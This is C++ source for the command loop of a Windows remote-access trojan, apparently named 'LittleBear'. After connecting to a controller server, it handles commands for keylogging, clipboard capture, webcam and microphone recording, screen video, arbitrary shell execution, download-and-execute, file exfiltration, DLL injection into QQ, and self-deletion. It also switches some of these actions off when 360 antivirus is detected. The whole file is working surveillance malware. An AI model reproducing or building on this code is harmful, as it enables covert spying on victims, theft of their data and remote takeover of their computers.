#include <Windows.h>
#include "../api.h"
#include "../function/KeyBoard.h"
#include "../function/interface.h"
#include "../function/SoundRecord.h"
#include "../BootStartup.h"
#include "../function/CameraCapture.h"
#include "../function/AppScreenshot.h"
#include "../function/HardDiskFile.h"
#include "../function/ScreenVideo.h"
#include "../function/ScreenSnapshot.h"
#include "../main.h"
#include "log.h"
#include "../function/ClipboardText.h"
#include "../AntiVirus.h"
#include "../function/ShellCommand.h"
#include "../initHelper.h"
#include "winternl.h"  
#include "NetWorkdata.h"
#include "../function/RemoteControl.h"
#include "../InjectDll.h"
#include "UploadLogFile.h"
#include "../function/UsbFileWatcher.h"
#include "UploadFile.h"
#include "DownloadFile.h"
#include "../function/interface.h"
#include "../function/DeviceInfo.h"
#include "NetWorkData.h"
#include "../function/SuicideSelf.h"
#include "../function/MessageBoxProc.h"
#include "../BootWithApp.h"
#include "function/filelistener.h"


//#pragma comment(linker,"/stack:0x100000")


DWORD dwInjectOn = FALSE;

HANDLE g_hKeyboardThread = 0;
HANDLE g_hDiskFileThread[64] = { 0 };
HANDLE g_hClipboardThread = 0;
HANDLE g_hRemoteThread = 0;


DWORD  WINAPI NetWorkCommand(VOID)
{

	int iRet = 0;
	try
	{
		if (*strLocalMac == 0)
		{
			iRet = GetNetCardInfo(strLocalIP, cMAC, strLocalMac, strExternalIP, strGateWayIP, strGateWayMac);
		}

		if (ulVolumeSerialNo == 0) {
			iRet = GetDiskVolumeSerialNo(&ulVolumeSerialNo);
			if (iRet == FALSE)
			{
				ulVolumeSerialNo = -1;
				writeLog("GetDiskVolumeSerialNo error\r\n");
			}
		}

		if (*strHostName == 0)
		{
			iRet = GetHostName(strHostName);
		}

		SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (hSock == SOCKET_ERROR)
		{
			writeLog("LittleBearWorkMain lpsocket error code:%u\r\n", lpRtlGetLastWin32Error());
			return FALSE;
		}

		DWORD dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("LittleBearWorkMain lpsend time lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());
			lpclosesocket(hSock);
			return FALSE;
		}

		dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
		{
			writeLog("LittleBearWorkMain lprecv time lpsetsockopt error code:%u\r\n", lpRtlGetLastWin32Error());
			lpclosesocket(hSock);
			return FALSE;
		}

		sockaddr_in stServCmdAddr = { 0 };
		lpRtlZeroMemory((char*)&stServCmdAddr, sizeof(sockaddr_in));
		stServCmdAddr.sin_addr.S_un.S_addr = gServerIP;
		stServCmdAddr.sin_port = lpntohs(NETWORK_CMDPORT);
		stServCmdAddr.sin_family = AF_INET;
		iRet = lpconnect(hSock, (sockaddr*)&stServCmdAddr, sizeof(sockaddr_in));
		if (iRet == SOCKET_ERROR)
		{
			lpclosesocket(hSock);

			writeLog("LittleBearWorkMain lpconnect error code:%u\r\n", lpRtlGetLastWin32Error());
			return FALSE;
		}


		iRet = SendCmdPacket(hSock, HEARTBEAT, 0);
		if (iRet <= 0)
		{
			lpclosesocket(hSock);
			writeLog("send heartbeat packet error:%u\r\n", GetLastError());
			return FALSE;
		}

		char* lpBuf = new char[NETWORK_DATABUF_SIZE];
		if (lpBuf == 0)
		{
			lpclosesocket(hSock);
			writeLog("LittleBearWorkMain new operator recv buffer error code:%u\r\n", lpRtlGetLastWin32Error());
			return FALSE;
		}

		while (TRUE)
		{
			int dwRecvSize = lprecv(hSock, lpBuf, NETWORK_DATABUF_SIZE, 0);
			if (dwRecvSize < sizeof(NETWORKPACKETHEADER))
			{
				writeLog("command thread recv data size:%d smaller than packet header\r\n", dwRecvSize);
				break;
			}

			NETWORKPACKETHEADER packhdr = *(LPNETWORKPACKETHEADER)lpBuf;
			int dwCommand = packhdr.cmd;
			UNIQUECLIENTSYMBOL Unique = packhdr.unique;
			if (memcmp(Unique.cMAC, cMAC, MAC_ADDRESS_LENGTH) || Unique.dwVolumeNO != ulVolumeSerialNo)
			{
				writeLog("recv packet unique or mac not same,recved volumeno:%u,local volumeno:%d\r\n", Unique.dwVolumeNO, ulVolumeSerialNo);
				break;
			}

			int dwDataSize = packhdr.packlen;
			if (dwDataSize < 0 || dwDataSize >= MAX_BUF_SIZE)
			{
				writeLog("recv packet size:%u error\r\n", dwDataSize);
				break;
			}

			//iRet = SendCmdPacket(hSock, HEARTBEAT, 0);
			//if (iRet <= 0)
			//{
			//	writeLog("send heartbeat packet error:%u\r\n", GetLastError());
			//	break;
			//}

			if (dwDataSize != dwRecvSize - sizeof(NETWORKPACKETHEADER))
			{
				if (dwCommand == DOWNLOADFILE || dwCommand == INJECTQQ || dwCommand == DOWNLOADRUNEXE)
				{
					if (dwCommand == INJECTQQ)
					{
						writeLog("recv INJECTQQ command\r\n");
						iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, (b360Running == 0) & (dwInjectOn == 0));
						if (iRet == NETWORK_ERROR_CODE)
						{
							break;
						}
						dwInjectOn = TRUE;
					}
					else if (dwCommand == DOWNLOADFILE)
					{
						writeLog("recv DOWNLOADFILE command\r\n");
						iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, FALSE);
						if (iRet == NETWORK_ERROR_CODE)
						{
							break;
						}
					}
					else if (dwCommand == DOWNLOADRUNEXE)
					{
						writeLog("recv DOWNLOADRUNEXE command\r\n");
						iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, TRUE);
						if (iRet == NETWORK_ERROR_CODE)
						{
							break;
						}
					}
					continue;
				}
				else {
					writeLog("unrecogonized packet ccommand:%u\r\n", dwCommand);
					break;
				}
			}

			if (dwCommand == HEARTBEAT)
			{

			}
			else if (dwCommand == DAILY_WORK_ITEM) {
				DWORD cmd = *(DWORD*)(lpBuf + sizeof(NETWORKPACKETHEADER));
				lpCloseHandle(lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)NetworkData, (LPVOID)cmd, 0, 0));
			}
			else if (dwCommand == UPLOADFILE)
			{
				writeLog("recv UPLOADFILE command\r\n");

				iRet = UploadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE);
				if (iRet == NETWORK_ERROR_CODE)
				{
					break;
				}
			}
			else if (dwCommand == DOWNLOADFILE || dwCommand == INJECTQQ || dwCommand == DOWNLOADRUNEXE)
			{
				if (dwCommand == INJECTQQ)
				{
					writeLog("recv INJECTQQ command\r\n");

					iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, (b360Running == 0) & (dwInjectOn == 0));
					if (iRet == NETWORK_ERROR_CODE)
					{
						break;
					}
					dwInjectOn = TRUE;
				}
				else if (dwCommand == DOWNLOADFILE)
				{
					writeLog("recv DOWNLOADFILE command\r\n");

					iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, FALSE);
					if (iRet == NETWORK_ERROR_CODE)
					{
						break;
					}
				}
				else if (dwCommand == DOWNLOADRUNEXE)
				{
					writeLog("recv DOWNLOADRUNEXE command\r\n");

					iRet = DownloadFile(hSock, lpBuf, dwRecvSize, NETWORK_DATABUF_SIZE, TRUE);
					if (iRet == NETWORK_ERROR_CODE)
					{
						break;
					}
				}
			}
			else if (dwCommand == SHELLCOMMAND)
			{
				writeLog("recv SHELLCOMMAND command\r\n");

				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.srclen < MAX_COMMAND_LENGTH)
				{
					char* szCmd = new char[filehdr.srclen + 1024];
					memmove(szCmd, lpBuf + sizeof(NETWORKFILEHDR), filehdr.srclen);
					*(szCmd + filehdr.srclen) = 0;
					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)RunShellCmd, (LPVOID)szCmd, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == CAMERAVIDEO)
			{
				writeLog("recv CAMERAVIDEO command\r\n");

				if (b360Running == 0)
				{
					NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
					if (filehdr.srclen < MAX_PATH)
					{
						char szCmd[MAX_PATH] = { 0 };
						memmove(szCmd, lpBuf + sizeof(NETWORKFILEHDR), filehdr.srclen);
						*(szCmd + filehdr.srclen) = 0;
						DWORD ulTimeDelay = atoi(szCmd);
						if (ulTimeDelay >= MAX_TIMELAST_SECONDVALUE)
						{
							ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
						}
						else if (ulTimeDelay <= 0)
						{
							ulTimeDelay = 60;
						}
						HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)CameraVideoCapture, (LPVOID)ulTimeDelay, 0, 0);
						lpCloseHandle(hThread);
					}
				}
			}
			else if (dwCommand == SCREENVIDEO)
			{
				writeLog("recv SCREENVIDEO command\r\n");

				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.srclen < MAX_PATH)
				{
					char szCmd[MAX_PATH] = { 0 };
					memmove(szCmd, lpBuf + sizeof(NETWORKFILEHDR), filehdr.srclen);
					*(szCmd + filehdr.srclen) = 0;
					DWORD ulTimeDelay = atoi(szCmd);
					if (ulTimeDelay >= MAX_TIMELAST_SECONDVALUE)
					{
						ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
					}
					else if (ulTimeDelay <= 0)
					{
						ulTimeDelay = 60;
					}
					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenVideo, (LPVOID)ulTimeDelay, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == SOUNDRECORD)
			{
				writeLog("recv SOUNDRECORD command\r\n");

				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.srclen < MAX_PATH)
				{
					char szCmd[MAX_PATH] = { 0 };
					memmove(szCmd, lpBuf + sizeof(NETWORKFILEHDR), filehdr.srclen);
					*(szCmd + filehdr.srclen) = 0;
					DWORD ulTimeDelay = atoi(szCmd);
					if (ulTimeDelay > MAX_TIMELAST_SECONDVALUE)
					{
						ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
					}
					else if (ulTimeDelay <= 0)
					{
						ulTimeDelay = 60;
					}

					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)SoundRecord, (LPVOID)ulTimeDelay, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == CAMERAPHOTO)
			{
				writeLog("recv CAMERAPHOTO command\r\n");

				if (b360Running == 0)
				{
					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)CameraPhotoCapture, 0, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == CLIPBOARDRECORD)
			{
				writeLog("recv CLIPBOARDRECORD command\r\n");

				int iTimeval = CLIPBOARD_RECORD_TIME_DELAY;
				if (g_hClipboardThread)
				{
					DWORD code = 0;
					iRet = GetExitCodeThread(g_hClipboardThread, &code);
					if (code == STILL_ACTIVE)
					{

					}
					else {
						lpCloseHandle(g_hClipboardThread);

						g_hClipboardThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetClipBoardText, (LPVOID)iTimeval, 0, 0);
					}
				}
				else {
					g_hClipboardThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetClipBoardText, (LPVOID)iTimeval, 0, 0);
				}
			}
			else if (dwCommand == KEYBOARDRECORD)
			{
				writeLog("recv KEYBOARDRECORD command\r\n");

				if (b360Running == 0)
				{
					int iTimeval = KEYBOARD_RECORD_DELAY;
					if (g_hKeyboardThread)
					{
						DWORD code = 0;
						iRet = GetExitCodeThread(g_hKeyboardThread, &code);
						if (code == STILL_ACTIVE)
						{

						}
						else {
							lpCloseHandle(g_hKeyboardThread);

							g_hKeyboardThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetKeyBoardRecord, (LPVOID)iTimeval, 0, 0);
						}
					}
					else {
						g_hKeyboardThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetKeyBoardRecord, (LPVOID)iTimeval, 0, 0);
					}
				}
			}
			else if (dwCommand == SUICIDE)
			{
				writeLog("recv SUICIDE command\r\n");
				HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)SuicideSelf, 0, 0, 0);
				lpCloseHandle(hThread);
				break;
			}
			else if (dwCommand == DISKFILERECORD)
			{
				writeLog("recv DISKFILERECORD command\r\n");

				if (g_hDiskFileThread[0])
				{
					DWORD code = 0;
					iRet = GetExitCodeThread(g_hDiskFileThread[0], &code);
					if (code == STILL_ACTIVE)
					{
						continue;
					}
					else {
						lpCloseHandle(g_hDiskFileThread[0]);
					}
				}
				else {

				}

				char strDisk[4096] = { 0 };
				int iLen = lpGetLogicalDriveStringsA(4096, strDisk);
				char* strDiskPtr = strDisk;
				for (int i = 0; i < iLen / 4; ++i)
				{
					iRet = lpGetDriveTypeA(strDiskPtr);
					if (iRet == DRIVE_FIXED || iRet == DRIVE_REMOTE || iRet == DRIVE_CDROM || iRet == DRIVE_REMOVABLE)
						//会出现不存在软盘异常 必须去掉DRIVE_REMOVABLE
					{
						if ((*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRet == DRIVE_REMOVABLE)
						{

						}
						else
						{
							g_hDiskFileThread[i] = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)VolumeWatcher, strDiskPtr, 0, 0);
							lpSleep(1000);
							//waitfor thread take its parameter
						}
					}
					strDiskPtr += 4;
				}
			}
			else if (dwCommand == REMOTECONTROL)
			{
				writeLog("recv REMOTECONTROL command\r\n");

				if (g_hRemoteThread)
				{
					DWORD code = 0;
					iRet = GetExitCodeThread(g_hRemoteThread, &code);
					if (code == STILL_ACTIVE)
					{

					}
					else {
						lpCloseHandle(g_hRemoteThread);

						g_hRemoteThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControl, 0, 0, 0);
					}
				}
				else {
					g_hRemoteThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControl, 0, 0, 0);
				}
			}
			else if (dwCommand == MESSAGEBOX)
			{
				writeLog("recv MESSAGEBOX command\r\n");

				NETWORKPACKETHEADER* hdr = (NETWORKPACKETHEADER*)lpBuf;
				LPDOUBLESTRINGPARAM param = (LPDOUBLESTRINGPARAM)(lpBuf + sizeof(NETWORKPACKETHEADER));
				if (hdr->packlen < MAX_CMD_LIMIT_SIZE)
				{
					char* lpparam = new char[hdr->packlen + 1024];
					memmove(lpparam, (char*)param, hdr->packlen);

					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)MessageBoxProc, lpparam, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == SYSTEMINFO)
			{
				writeLog("recv SYSTEMINFO command\r\n");

				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetMachineInfo, 0, 0, 0));
			}
		}
	_process_end:
		delete[] lpBuf;
		lpclosesocket(hSock);
		return TRUE;
	}
	catch (...)
	{
		writeLog("GetStartupConfig function exception error code is:%u\r\n", lpRtlGetLastWin32Error());
		return FALSE;
	}
}


